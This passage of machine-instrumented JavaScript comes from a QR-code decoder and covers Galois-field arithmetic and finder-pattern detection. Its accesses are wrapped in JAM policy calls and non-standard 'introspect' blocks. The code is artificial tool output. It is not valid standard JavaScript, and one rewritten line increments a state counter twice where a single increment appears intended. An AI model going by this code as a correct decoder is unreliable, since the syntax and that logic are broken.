      largerCoefficients = temp$$4;
    }
    var sumDiff = JAM.new(Array, [largerCoefficients.length], JAM.policy.p39);
    var lengthDiff = largerCoefficients.length - smallerCoefficients.length;
    var ci$$1 = 0;
    var v736 = ci$$1 < lengthDiff;
    for (;v736;) {
      introspect(JAM.policy.p27) {
        sumDiff[ci$$1] = largerCoefficients[ci$$1];
      }
      ci$$1 = ci$$1 + 1;
      v736 = ci$$1 < lengthDiff;
    }
    var i$$37 = lengthDiff;
    var v739 = i$$37 < largerCoefficients.length;
    for (;v739;) {
      var v737 = sumDiff;
      var v738 = i$$37;
      var v2348 = i$$37 - lengthDiff;
      introspect(JAM.policy.p26) {
        var v1610 = smallerCoefficients[v2348]
      }
      introspect(JAM.policy.p26) {
        var v1611 = largerCoefficients[i$$37]
      }
      var v2866 = JAM.call(GF256.addOrSubtract, GF256, [v1610, v1611], JAM.policy.p38);
      introspect(JAM.policy.p27) {
        v737[v738] = v2866;
      }
      i$$37 = i$$37 + 1;
      v739 = i$$37 < largerCoefficients.length;
    }
    return JAM.new(GF256Poly, [field$$1, sumDiff], JAM.policy.p38);
  }
  function v72(a$$2) {
    if (a$$2 === 0) {
      return JAM.call(this.getCoefficient, this, [0], JAM.policy.p25);
    }
    var size$$4 = this.coefficients.length;
    if (a$$2 === 1) {
      var result$$5 = 0;
      var i$$36 = 0;
      var v743 = i$$36 < size$$4;
      for (;v743;) {
        var v1613 = this.coefficients;
        introspect(JAM.policy.p26) {
          var v742 = v1613[i$$36]
        }
        result$$5 = JAM.call(GF256.addOrSubtract, GF256, [result$$5, v742], JAM.policy.p38);
        i$$36 = i$$36 + 1;
        v743 = i$$36 < size$$4;
      }
      return result$$5;
    }
    var v745 = this.coefficients;
    introspect(JAM.policy.p26) {
      var result2 = v745[0]
    }
    i$$36 = 1;
    var v748 = i$$36 < size$$4;
    for (;v748;) {
      var v1614 = this.field;
      var v746 = JAM.call(v1614.multiply, v1614, [a$$2, result2], JAM.policy.p38);
      var v1615 = this.coefficients;
      introspect(JAM.policy.p26) {
        var v747 = v1615[i$$36]
      }
      result2 = JAM.call(GF256.addOrSubtract, GF256, [v746, v747], JAM.policy.p38);
      i$$36 = i$$36 + 1;
      v748 = i$$36 < size$$4;
    }
    return result2;
  }
  function v71(degree) {
    var v749 = this.coefficients;
    var v750 = this.coefficients.length - 1 - degree;
    introspect(JAM.policy.p26) {
      return v749[v750];
    }
  }
  function v70() {
    return this.coefficients;
  }
  function v69() {
    return this.coefficients.length - 1;
  }
  function v68() {
    var v1618 = this.coefficients;
    introspect(JAM.policy.p26) {
      var v752 = v1618[0]
    }
    return v752 === 0;
  }
  var v1619 = coefficients === null;
  if (!v1619) {
    v1619 = coefficients.length === 0;
  }
  if (v1619) {
    throw "System.ArgumentException";
  }
  this.field = field$$1;
  var coefficientsLength = coefficients.length;
  var v1620 = coefficientsLength > 1;
  if (v1620) {
    introspect(JAM.policy.p26) {
      var v2352 = coefficients[0]
    }
    v1620 = v2352 === 0;
  }
  if (v1620) {
    var firstNonZero = 1;
    var v1621 = firstNonZero < coefficientsLength;
    if (v1621) {
      introspect(JAM.policy.p26) {
        var v2353 = coefficients[firstNonZero]
      }
      v1621 = v2353 === 0;
    }
    var v754 = v1621;
    for (;v754;) {
      firstNonZero = firstNonZero + 1;
      var v1622 = firstNonZero < coefficientsLength;
      if (v1622) {
        introspect(JAM.policy.p26) {
          var v2354 = coefficients[firstNonZero]
        }
        v1622 = v2354 === 0;
      }
      v754 = v1622;
    }
    if (firstNonZero === coefficientsLength) {
      this.coefficients = field$$1.Zero.coefficients;
    } else {
      var v2867 = JAM.new(Array, [coefficientsLength - firstNonZero], JAM.policy.p39);
      this.coefficients = v2867;
      var i$$35 = 0;
      var v758 = i$$35 < this.coefficients.length;
      for (;v758;) {
        var v757 = this.coefficients;
        introspect(JAM.policy.p27) {
          v757[i$$35] = 0;
        }
        i$$35 = i$$35 + 1;
        v758 = i$$35 < this.coefficients.length;
      }
      var ci = 0;
      var v760 = ci < this.coefficients.length;
      for (;v760;) {
        var v759 = this.coefficients;
        var v1626 = firstNonZero + ci;
        introspect(JAM.policy.p27) {
          v759[ci] = coefficients[v1626];
        }
        ci = ci + 1;
        v760 = ci < this.coefficients.length;
      }
    }
  } else {
    this.coefficients = coefficients;
  }
  JAM.call(this.__defineGetter__, this, ["Zero", v68], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Degree", v69], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Coefficients", v70], JAM.policy.p23);
  this.getCoefficient = v71;
  this.evaluateAt = v72;
  this.addOrSubtract = v73;
  this.multiply1 = v74;
  this.multiply2 = v75;
  this.multiplyByMonomial = v76;
  this.divide = v77;
  return;
}
function GF256(primitive) {
  function v84(a$$6, b$$2) {
    var v1628 = a$$6 === 0;
    if (!v1628) {
      v1628 = b$$2 === 0;
    }
    if (v1628) {
      return 0;
    }
    if (a$$6 === 1) {
      return b$$2;
    }
    if (b$$2 === 1) {
      return a$$6;
    }
    var v766 = this.expTable;
    var v2593 = this.logTable;
    introspect(JAM.policy.p26) {
      var v2360 = v2593[a$$6]
    }
    var v2594 = this.logTable;
    introspect(JAM.policy.p26) {
      var v2361 = v2594[b$$2]
    }
    var v767 = (v2360 + v2361) % 255;
    introspect(JAM.policy.p26) {
      return v766[v767];
    }
  }
  function v83(a$$5) {
    if (a$$5 === 0) {
      throw "System.ArithmeticException";
    }
    var v769 = this.expTable;
    var v2362 = this.logTable;
    introspect(JAM.policy.p26) {
      var v1630 = v2362[a$$5]
    }
    var v770 = 255 - v1630;
    introspect(JAM.policy.p26) {
      return v769[v770];
    }
  }
  function v82(a$$4) {
    if (a$$4 === 0) {
      throw "System.ArgumentException";
    }
    var v772 = this.logTable;
    introspect(JAM.policy.p26) {
      return v772[a$$4];
    }
  }
  function v81(a$$3) {
    var v773 = this.expTable;
    introspect(JAM.policy.p26) {
      return v773[a$$3];
    }
  }
  function v80(degree$$2, coefficient$$1) {
    if (degree$$2 < 0) {
      throw "System.ArgumentException";
    }
    if (coefficient$$1 === 0) {
      return zero;
    }
    var coefficients$$1 = JAM.new(Array, [degree$$2 + 1], JAM.policy.p39);
    var i$$42 = 0;
    var v777 = i$$42 < coefficients$$1.length;
    for (;v777;) {
      introspect(JAM.policy.p27) {
        coefficients$$1[i$$42] = 0;
      }
      i$$42 = i$$42 + 1;
      v777 = i$$42 < coefficients$$1.length;
    }
    introspect(JAM.policy.p27) {
      coefficients$$1[0] = coefficient$$1;
    }
    return JAM.new(GF256Poly, [this, coefficients$$1], JAM.policy.p38);
  }
  function v79() {
    return this.one;
  }
  function v78() {
    return this.zero;
  }
  var v2868 = JAM.new(Array, [256], JAM.policy.p25);
  this.expTable = v2868;
  var v2869 = JAM.new(Array, [256], JAM.policy.p25);
  this.logTable = v2869;
  var x$$57 = 1;
  var i$$41 = 0;
  var v780 = i$$41 < 256;
  for (;v780;) {
    var v778 = this.expTable;
    introspect(JAM.policy.p27) {
      v778[i$$41] = x$$57;
    }
    x$$57 = x$$57 << 1;
    if (x$$57 >= 256) {
      x$$57 = x$$57 ^ primitive;
    }
    i$$41 = i$$41 + 1;
    v780 = i$$41 < 256;
  }
  i$$41 = 0;
  var v783 = i$$41 < 255;
  for (;v783;) {
    var v781 = this.logTable;
    var v1633 = this.expTable;
    introspect(JAM.policy.p26) {
      var v782 = v1633[i$$41]
    }
    JAM.set(v781, v782, i$$41, JAM.policy.p27);
    i$$41 = i$$41 + 1;
    v783 = i$$41 < 255;
  }
  var at0 = JAM.new(Array, [1], JAM.policy.p25);
  introspect(JAM.policy.p27) {
    at0[0] = 0;
  }
  var v2870 = JAM.new(GF256Poly, [this, JAM.new(Array, [at0], JAM.policy.p39)], JAM.policy.p38);
  this.zero = v2870;
  var at1 = JAM.new(Array, [1], JAM.policy.p25);
  introspect(JAM.policy.p27) {
    at1[0] = 1;
  }
  var v2871 = JAM.new(GF256Poly, [this, JAM.new(Array, [at1], JAM.policy.p39)], JAM.policy.p38);
  this.one = v2871;
  JAM.call(this.__defineGetter__, this, ["Zero", v78], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["One", v79], JAM.policy.p23);
  this.buildMonomial = v80;
  this.exp = v81;
  this.log = v82;
  this.inverse = v83;
  this.multiply = v84;
  return;
}
function URShift(number, bits$$14) {
  if (number >= 0) {
    return number >> bits$$14;
  } else {
    return(number >> bits$$14) + (2 << ~bits$$14);
  }
  return;
}
function FinderPattern(posX, posY, estimatedModuleSize) {
  function v90(moduleSize$$2, i$$47, j$$25) {
    var v1635 = JAM.call(Math.abs, Math, [i$$47 - this.y], JAM.policy.p39) <= moduleSize$$2;
    if (v1635) {
      v1635 = JAM.call(Math.abs, Math, [j$$25 - this.x], JAM.policy.p39) <= moduleSize$$2;
    }
    if (v1635) {
      var moduleSizeDiff = JAM.call(Math.abs, Math, [moduleSize$$2 - this.estimatedModuleSize], JAM.policy.p39);
      var v790 = moduleSizeDiff <= 1;
      if (!v790) {
        v790 = moduleSizeDiff / this.estimatedModuleSize <= 1;
      }
      return v790;
    }
    return false;
  }
  function v89() {
    this.count = this.count + 1;
    return;
  }
  function v88() {
    return this.y;
  }
  function v87() {
    return this.x;
  }
  function v86() {
    return this.count;
  }
  function v85() {
    return this.estimatedModuleSize;
  }
  this.x = posX;
  this.y = posY;
  this.count = 1;
  this.estimatedModuleSize = estimatedModuleSize;
  JAM.call(this.__defineGetter__, this, ["EstimatedModuleSize", v85], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Count", v86], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["X", v87], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["Y", v88], JAM.policy.p23);
  this.incrementCount = v89;
  this.aboutEquals = v90;
  return;
}
function FinderPatternInfo(patternCenters) {
  function v93() {
    return this.topRight;
  }
  function v92() {
    return this.topLeft;
  }
  function v91() {
    return this.bottomLeft;
  }
  introspect(JAM.policy.p26) {
    this.bottomLeft = patternCenters[0];
  }
  introspect(JAM.policy.p26) {
    this.topLeft = patternCenters[1];
  }
  introspect(JAM.policy.p26) {
    this.topRight = patternCenters[2];
  }
  JAM.call(this.__defineGetter__, this, ["BottomLeft", v91], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["TopLeft", v92], JAM.policy.p23);
  JAM.call(this.__defineGetter__, this, ["TopRight", v93], JAM.policy.p23);
  return;
}
function FinderPatternFinder() {
  function v105(image$$10) {
    var tryHarder = false;
    this.image = image$$10;
    var maxI$$1 = qrcode.height;
    var maxJ$$1 = qrcode.width;
    var iSkip = JAM.call(Math.floor, Math, [3 * maxI$$1 / (4 * MAX_MODULES)], JAM.policy.p39);
    var v1642 = iSkip < MIN_SKIP;
    if (!v1642) {
      v1642 = tryHarder;
    }
    if (v1642) {
      iSkip = MIN_SKIP;
    }
    var done = false;
    var stateCount$$5 = JAM.new(Array, [5], JAM.policy.p25);
    var i$$54 = iSkip - 1;
    var v1643 = i$$54 < maxI$$1;
    if (v1643) {
      v1643 = !done;
    }
    var v805 = v1643;
    for (;v805;) {
      introspect(JAM.policy.p27) {
        stateCount$$5[0] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$5[1] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$5[2] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$5[3] = 0;
      }
      introspect(JAM.policy.p27) {
        stateCount$$5[4] = 0;
      }
      var currentState = 0;
      var j$$28 = 0;
      var v802 = j$$28 < maxJ$$1;
      for (;v802;) {
        var v1644 = j$$28 + i$$54 * qrcode.width;
        introspect(JAM.policy.p26) {
          var v801 = image$$10[v1644]
        }
        if (v801) {
          if ((currentState & 1) === 1) {
            currentState = currentState + 1;
          }
          introspect(JAM.policy.p26) {
            var v1646 = stateCount$$5[currentState]
          }
          introspect(JAM.policy.p27) {
            stateCount$$5[currentState] = v1646 + 1;
          }
        } else {
          if ((currentState & 1) === 0) {
            if (currentState === 4) {
              if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p39)) {
                var confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, j$$28], JAM.policy.p38);
                if (confirmed) {
                  iSkip = 2;
                  if (this.hasSkipped) {
                    done = JAM.call(this.haveMultiplyConfirmedCenters, this, [], JAM.policy.p40);
                  } else {
                    var rowSkip = JAM.call(this.findRowSkip, this, [], JAM.policy.p40);
                    introspect(JAM.policy.p26) {
                      var v1648 = stateCount$$5[2]
                    }
                    if (rowSkip > v1648) {
                      introspect(JAM.policy.p26) {
                        var v2598 = stateCount$$5[2]
                      }
                      i$$54 = i$$54 + (rowSkip - v2598 - iSkip);
                      j$$28 = maxJ$$1 - 1;
                    }
                  }
                } else {
                  var v1650 = j$$28 < maxJ$$1;
                  if (v1650) {
                    var v2599 = j$$28 + i$$54 * qrcode.width;
                    introspect(JAM.policy.p26) {
                      var v2369 = image$$10[v2599]
                    }
                    v1650 = !v2369;
                  }
                  var v797 = v1650;
                  do {
                    j$$28 = j$$28 + 1;
                    var v1651 = j$$28 < maxJ$$1;
                    if (v1651) {
                      var v2600 = j$$28 + i$$54 * qrcode.width;
                      introspect(JAM.policy.p26) {
                        var v2370 = image$$10[v2600]
                      }
                      v1651 = !v2370;
                    }
                    v797 = v1651;
                  } while (v797);
                  j$$28 = j$$28 - 1;
                }
                currentState = 0;
                introspect(JAM.policy.p27) {
                  stateCount$$5[0] = 0;
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[1] = 0;
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[2] = 0;
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[3] = 0;
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[4] = 0;
                }
              } else {
                introspect(JAM.policy.p27) {
                  stateCount$$5[0] = stateCount$$5[2];
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[1] = stateCount$$5[3];
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[2] = stateCount$$5[4];
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[3] = 1;
                }
                introspect(JAM.policy.p27) {
                  stateCount$$5[4] = 0;
                }
                currentState = 3;
              }
            } else {
              var v1652 = currentState = currentState + 1;
              var v2601 = currentState = currentState + 1;
              introspect(JAM.policy.p26) {
                var v2371 = stateCount$$5[v2601]
              }
              introspect(JAM.policy.p27) {
                stateCount$$5[v1652] = v2371 + 1;
              }
            }
          } else {
            introspect(JAM.policy.p26) {
              var v1653 = stateCount$$5[currentState]
            }
            introspect(JAM.policy.p27) {
              stateCount$$5[currentState] = v1653 + 1;
            }
          }
        }
        j$$28 = j$$28 + 1;
        v802 = j$$28 < maxJ$$1;
      }
      if (JAM.call(this.foundPatternCross, this, [stateCount$$5], JAM.policy.p39)) {
        confirmed = JAM.call(this.handlePossibleCenter, this, [stateCount$$5, i$$54, maxJ$$1], JAM.policy.p38);
        if (confirmed) {
          introspect(JAM.policy.p26) {
            iSkip = stateCount$$5[0];
          }
          if (this.hasSkipped) {
            done = JAM.call(haveMultiplyConfirmedCenters, null, [], JAM.policy.p40);
          }
        }
      }
      i$$54 = i$$54 + iSkip;
      var v1654 = i$$54 < maxI$$1;
      if (v1654) {
        v1654 = !done;
      }
      v805 = v1654;
    }
    var patternInfo = JAM.call(this.selectBestPatterns, this, [], JAM.policy.p40);
    JAM.call(qrcode.orderBestPatterns, qrcode, [patternInfo], JAM.policy.p39);
    return JAM.new(FinderPatternInfo, [patternInfo], JAM.policy.p39);
  }
  function v104() {
    var confirmedCount = 0;
    var totalModuleSize$$2 = 0;
    var max$$7 = this.possibleCenters.length;
    var i$$53 = 0;
    var v809 = i$$53 < max$$7;
    for (;v809;) {
      var v807 = this.possibleCenters;
      introspect(JAM.policy.p26) {
        var pattern$$3 = v807[i$$53]
      }
      if (pattern$$3.Count >= CENTER_QUORUM) {
        confirmedCount = confirmedCount + 1;
        totalModuleSize$$2 = totalModuleSize$$2 + pattern$$3.EstimatedModuleSize;
      }
      i$$53 = i$$53 + 1;
      v809 = i$$53 < max$$7;
    }
    if (confirmedCount < 3) {
      return false;
    }
    var average$$1 = totalModuleSize$$2 / max$$7;
    var totalDeviation = 0;
    i$$53 = 0;
    var v812 = i$$53 < max$$7;
    for (;v812;) {
      var v811 = this.possibleCenters;
      introspect(JAM.policy.p26) {
        pattern$$3 = v811[i$$53];
      }
      totalDeviation = totalDeviation + JAM.call(Math.abs, Math, [pattern$$3.EstimatedModuleSize - average$$1], JAM.policy.p39);
      i$$53 = i$$53 + 1;
      v812 = i$$53 < max$$7;
    }
    return totalDeviation <= .05 * totalModuleSize$$2;
  }
  function v103() {
    var max$$6 = this.possibleCenters.length;
    if (max$$6 <= 1) {
      return 0;
    }
    var firstConfirmedCenter = null;
    var i$$52 = 0;
    var v820 = i$$52 < max$$6;
    for (;v820;) {
      var v816 = this.possibleCenters;
      introspect(JAM.policy.p26) {
        var center$$1 = v816[i$$52]
      }
      if (center$$1.Count >= CENTER_QUORUM) {
        if (firstConfirmedCenter === null) {
          firstConfirmedCenter = center$$1;
        } else {
          this.hasSkipped = true;
          return JAM.call(Math.floor, Math, [(JAM.call(Math.abs, Math, [firstConfirmedCenter.X - center$$1.X], JAM.policy.p39) - JAM.call(Math.abs, Math, [firstConfirmedCenter.Y - center$$1.Y], JAM.policy.p39)) / 2], JAM.policy.p39);
        }
      }
      i$$52 = i$$52 + 1;
      v820 = i$$52 < max$$6;
    }
    return 0;
  }
  function v102() {
    function v101(a$$8, b$$4) {
      if (a$$8.count > b$$4.count) {
        return-1;
      }
      if (a$$8.count < b$$4.count) {
        return 1;
      }
      return 0;
    }
    function v100(center1, center2) {
      var dA = JAM.call(Math.abs, Math, [center2.EstimatedModuleSize - average], JAM.policy.p39);
      var dB = JAM.call(Math.abs, Math, [center1.EstimatedModuleSize - average], JAM.policy.p39);
      if (dA < dB) {
        return-1;
      } else {
        if (dA === dB) {
          return 0;
        } else {
          return 1;
        }
      }
      return;
    }
    var startSize = this.possibleCenters.length;
    if (startSize < 3) {
      throw "Couldn't find enough finder patterns";
    }
    if (startSize > 3) {
      var totalModuleSize$$1 = 0;
      var square = 0;
      var i$$51 = 0;
      var v830 = i$$51 < startSize;
      for (;v830;) {
        var v1667 = this.possibleCenters;
        introspect(JAM.policy.p26) {
          var v829 = v1667[i$$51]
        }
        var centerValue = v829.EstimatedModuleSize;
        totalModuleSize$$1 = totalModuleSize$$1 + centerValue;
        square = square + centerValue * centerValue;
        i$$51 = i$$51 + 1;
        v830 = i$$51 < startSize;
      }
      var average = totalModuleSize$$1 / startSize;
      var v831 = this.possibleCenters;
      JAM.call(v831.sort, v831, [v100], JAM.policy.p39);
      var stdDev = JAM.call(Math.sqrt, Math, [square / startSize - average * average], JAM.policy.p39);
      var limit = JAM.call(Math.max, Math, [.2 * average, stdDev], JAM.policy.p38);
      i$$51 = 0;
      var v1671 = i$$51 < this.possibleCenters.length;
      if (v1671) {
        v1671 = this.possibleCenters.length > 3;
      }
      var v837 = v1671;
      for (;v837;) {
        var v834 = this.possibleCenters;
        introspect(JAM.policy.p26) {
          var pattern$$2 = v834[i$$51]
        }
        if (JAM.call(Math.abs, Math, [pattern$$2.EstimatedModuleSize - average], JAM.policy.p39) > limit) {
          var v835 = this.possibleCenters;
          JAM.call(v835.remove, v835, [i$$51], JAM.policy.p39);
          i$$51 = i$$51 - 1;
        }
        i$$51 = i$$51 + 1;
        var v1673 = i$$51 < this.possibleCenters.length;
        if (v1673) {
          v1673 = this.possibleCenters.length > 3;
        }
        v837 = v1673;
      }
    }
    if (this.possibleCenters.length > 3) {
      var v839 = this.possibleCenters;
      JAM.call(v839.sort, v839, [v101], JAM.policy.p39);
    }
    var v1675 = this.possibleCenters;
    introspect(JAM.policy.p26) {
      var v841 = v1675[0]
    }
    var v1676 = this.possibleCenters;
    introspect(JAM.policy.p26) {
      var v842 = v1676[1]
    }
    var v1677 = this.possibleCenters;
    introspect(JAM.policy.p26) {
      var v843 = v1677[2]
    }
    return JAM.new(Array, [v841, v842, v843], JAM.policy.p38);
  }
  function v99(stateCount$$4, i$$50, j$$27) {
    introspect(JAM.policy.p26) {
      var v2610 = stateCount$$4[0]
    }
    introspect(JAM.policy.p26) {
      var v2611 = stateCount$$4[1]
    }
    var v2381 = v2610 + v2611;
    introspect(JAM.policy.p26) {
      var v2382 = stateCount$$4[2]
    }
    var v1678 = v2381 + v2382;
    introspect(JAM.policy.p26) {
      var v1679 = stateCount$$4[3]
    }
    var v844 = v1678 + v1679;
    introspect(JAM.policy.p26) {
      var v845 = stateCount$$4[4]
    }
    var stateCountTotal$$2 = v844 + v845;
    var centerJ$$1 = JAM.call(this.centerFromEnd, this, [stateCount$$4, j$$27], JAM.policy.p38);
    var v846 = JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p39);
    introspect(JAM.policy.p26) {
      var v847 = stateCount$$4[2]
    }
    var centerI$$1 = JAM.call(this.crossCheckVertical, this, [i$$50, v846, v847, stateCountTotal$$2], JAM.policy.p38);
    if (!JAM.call(isNaN, null, [centerI$$1], JAM.policy.p39)) {
      var v848 = JAM.call(Math.floor, Math, [centerJ$$1], JAM.policy.p39);
      var v849 = JAM.call(Math.floor, Math, [centerI$$1], JAM.policy.p39);
      introspect(JAM.policy.p26) {
        var v850 = stateCount$$4[2]
      }
      centerJ$$1 = JAM.call(this.crossCheckHorizontal, this, [v848, v849, v850, stateCountTotal$$2], JAM.policy.p38);
      if (!JAM.call(isNaN, null, [centerJ$$1], JAM.policy.p39)) {
        var estimatedModuleSize$$1 = stateCountTotal$$2 / 7;
        var found = false;
        var max$$5 = this.possibleCenters.length;
        var index$$39 = 0;
        var v854 = index$$39 < max$$5;
        for (;v854;) {
          var v852 = this.possibleCenters;
          introspect(JAM.policy.p26) {
            var center = v852[index$$39]
          }
          if (JAM.call(center.aboutEquals, center, [estimatedModuleSize$$1, centerI$$1, centerJ$$1], JAM.policy.p38)) {
            JAM.call(center.incrementCount, center, [], JAM.policy.p40);
            found = true;
            break;
          }
          index$$39 = index$$39 + 1;
          v854 = index$$39 < max$$5;
        }
        if (!found) {
          var point$$2 = JAM.new(FinderPattern, [centerJ$$1, centerI$$1, estimatedModuleSize$$1], JAM.policy.p38);
          var v855 = this.possibleCenters;
          JAM.call(v855.push, v855, [point$$2], JAM.policy.p39);
          if (this.resultPointCallback !== null) {
            var v856 = this.resultPointCallback;
            JAM.call(v856.foundPossibleResultPoint, v856, [point$$2], JAM.policy.p39);
          }
        }
        return true;
      }
    }
    return false;
  }
  function v98(startJ, centerI, maxCount$$1, originalStateCountTotal$$1) {
    var image$$9 = this.image;
    var maxJ = qrcode.width;
    var stateCount$$3 = this.CrossCheckStateCount;
    var j$$26 = startJ;
    var v1683 = j$$26 >= 0;
    if (v1683) {
      var v2383 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        v1683 = image$$9[v2383];
      }
    }
    var v861 = v1683;
    for (;v861;) {
      introspect(JAM.policy.p26) {
        var v1684 = stateCount$$3[2]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[2] = v1684 + 1;
      }
      j$$26 = j$$26 - 1;
      var v1685 = j$$26 >= 0;
      if (v1685) {
        var v2384 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          v1685 = image$$9[v2384];
        }
      }
      v861 = v1685;
    }
    if (j$$26 < 0) {
      return NaN;
    }
    var v2385 = j$$26 >= 0;
    if (v2385) {
      var v2715 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2614 = image$$9[v2715]
      }
      v2385 = !v2614;
    }
    var v1686 = v2385;
    if (v1686) {
      introspect(JAM.policy.p26) {
        var v2386 = stateCount$$3[1]
      }
      v1686 = v2386 <= maxCount$$1;
    }
    var v863 = v1686;
    for (;v863;) {
      introspect(JAM.policy.p26) {
        var v1687 = stateCount$$3[1]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[1] = v1687 + 1;
      }
      j$$26 = j$$26 - 1;
      var v2387 = j$$26 >= 0;
      if (v2387) {
        var v2716 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2615 = image$$9[v2716]
        }
        v2387 = !v2615;
      }
      var v1688 = v2387;
      if (v1688) {
        introspect(JAM.policy.p26) {
          var v2388 = stateCount$$3[1]
        }
        v1688 = v2388 <= maxCount$$1;
      }
      v863 = v1688;
    }
    var v1689 = j$$26 < 0;
    if (!v1689) {
      introspect(JAM.policy.p26) {
        var v2389 = stateCount$$3[1]
      }
      v1689 = v2389 > maxCount$$1;
    }
    if (v1689) {
      return NaN;
    }
    var v2391 = j$$26 >= 0;
    if (v2391) {
      var v2616 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        v2391 = image$$9[v2616];
      }
    }
    var v1690 = v2391;
    if (v1690) {
      introspect(JAM.policy.p26) {
        var v2392 = stateCount$$3[0]
      }
      v1690 = v2392 <= maxCount$$1;
    }
    var v865 = v1690;
    for (;v865;) {
      introspect(JAM.policy.p26) {
        var v1691 = stateCount$$3[0]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[0] = v1691 + 1;
      }
      j$$26 = j$$26 - 1;
      var v2393 = j$$26 >= 0;
      if (v2393) {
        var v2617 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          v2393 = image$$9[v2617];
        }
      }
      var v1692 = v2393;
      if (v1692) {
        introspect(JAM.policy.p26) {
          var v2394 = stateCount$$3[0]
        }
        v1692 = v2394 <= maxCount$$1;
      }
      v865 = v1692;
    }
    introspect(JAM.policy.p26) {
      var v1693 = stateCount$$3[0]
    }
    if (v1693 > maxCount$$1) {
      return NaN;
    }
    j$$26 = startJ + 1;
    var v1694 = j$$26 < maxJ;
    if (v1694) {
      var v2395 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        v1694 = image$$9[v2395];
      }
    }
    var v867 = v1694;
    for (;v867;) {
      introspect(JAM.policy.p26) {
        var v1695 = stateCount$$3[2]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[2] = v1695 + 1;
      }
      j$$26 = j$$26 + 1;
      var v1696 = j$$26 < maxJ;
      if (v1696) {
        var v2396 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          v1696 = image$$9[v2396];
        }
      }
      v867 = v1696;
    }
    if (j$$26 === maxJ) {
      return NaN;
    }
    var v2397 = j$$26 < maxJ;
    if (v2397) {
      var v2721 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        var v2620 = image$$9[v2721]
      }
      v2397 = !v2620;
    }
    var v1697 = v2397;
    if (v1697) {
      introspect(JAM.policy.p26) {
        var v2398 = stateCount$$3[3]
      }
      v1697 = v2398 < maxCount$$1;
    }
    var v869 = v1697;
    for (;v869;) {
      introspect(JAM.policy.p26) {
        var v1698 = stateCount$$3[3]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[3] = v1698 + 1;
      }
      j$$26 = j$$26 + 1;
      var v2399 = j$$26 < maxJ;
      if (v2399) {
        var v2722 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          var v2621 = image$$9[v2722]
        }
        v2399 = !v2621;
      }
      var v1699 = v2399;
      if (v1699) {
        introspect(JAM.policy.p26) {
          var v2400 = stateCount$$3[3]
        }
        v1699 = v2400 < maxCount$$1;
      }
      v869 = v1699;
    }
    var v1700 = j$$26 === maxJ;
    if (!v1700) {
      introspect(JAM.policy.p26) {
        var v2401 = stateCount$$3[3]
      }
      v1700 = v2401 >= maxCount$$1;
    }
    if (v1700) {
      return NaN;
    }
    var v2403 = j$$26 < maxJ;
    if (v2403) {
      var v2622 = j$$26 + centerI * qrcode.width;
      introspect(JAM.policy.p26) {
        v2403 = image$$9[v2622];
      }
    }
    var v1701 = v2403;
    if (v1701) {
      introspect(JAM.policy.p26) {
        var v2404 = stateCount$$3[4]
      }
      v1701 = v2404 < maxCount$$1;
    }
    var v871 = v1701;
    for (;v871;) {
      introspect(JAM.policy.p26) {
        var v1702 = stateCount$$3[4]
      }
      introspect(JAM.policy.p27) {
        stateCount$$3[4] = v1702 + 1;
      }
      j$$26 = j$$26 + 1;
      var v2405 = j$$26 < maxJ;
      if (v2405) {
        var v2623 = j$$26 + centerI * qrcode.width;
        introspect(JAM.policy.p26) {
          v2405 = image$$9[v2623];
        }
      }
      var v1703 = v2405;
      if (v1703) {
        introspect(JAM.policy.p26) {
          var v2406 = stateCount$$3[4]
        }
        v1703 = v2406 < maxCount$$1;
      }
      v871 = v1703;
    }
    introspect(JAM.policy.p26) {
      var v1704 = stateCount$$3[4]
    }
    if (v1704 >= maxCount$$1) {
      return NaN;
    }
    introspect(JAM.policy.p26) {
      var v2624 = stateCount$$3[0]
    }
    introspect(JAM.policy.p26) {
      var v2625 = stateCount$$3[1]
    }
    var v2407 = v2624 + v2625;
    introspect(JAM.policy.p26) {
      var v2408 = stateCount$$3[2]
    }
    var v1705 = v2407 + v2408;
    introspect(JAM.policy.p26) {
      var v1706 = stateCount$$3[3]
    }
    var v873 = v1705 + v1706;
    introspect(JAM.policy.p26) {
      var v874 = stateCount$$3[4]
    }
    var stateCountTotal$$1 = v873 + v874;
    if (5 * JAM.call(Math.abs, Math, [stateCountTotal$$1 - originalStateCountTotal$$1], JAM.policy.p39) >= originalStateCountTotal$$1) {
      return NaN;
    }
    var v876;
    if (JAM.call(this.foundPatternCross, this, [stateCount$$3], JAM.policy.p39)) {
      v876 = JAM.call(this.centerFromEnd, this, [stateCount$$3, j$$26], JAM.policy.p38);
    } else {
      v876 = NaN;
    }
    return v876;
  }
